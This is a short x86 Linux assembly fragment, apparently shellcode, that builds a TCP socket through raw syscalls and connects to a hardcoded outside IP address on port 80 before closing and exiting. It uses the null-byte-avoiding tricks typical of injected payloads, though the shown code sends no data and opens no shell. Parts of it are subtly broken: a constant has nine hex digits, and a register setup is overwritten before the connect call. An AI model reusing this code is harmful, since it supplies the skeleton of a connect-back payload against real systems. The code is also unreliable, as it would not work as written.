section .text

global _start

_start:
    xor ecx, ecx		; socket()
    push ecx
    push 1
    push 2
    mov ecx, esp
    mov bl, 1
    mov al, 66h
    int 0x80

	push 0x764ce3d4		; htonl(212.227.127.81)
	mov edx, 0x0affffffd
	neg edx
	dec edx
	push edx			; htons(80), AF_INET 2
    xor edx,edx
	mov ecx, esp		; temp struct place
	push 0x10			; sizeof(sockaddr)
	push ecx			; (struct sockaddr *)&struct
	push eax			; socket descriptor
	mov ecx, esp		; arguments to ecx
	mov bl, 3
	mov ebx, eax		; save socket descriptor
	mov al, 66h
	int 0x80


    mov al, 6
    int 0x80

    mov al, 1
    int 0x80

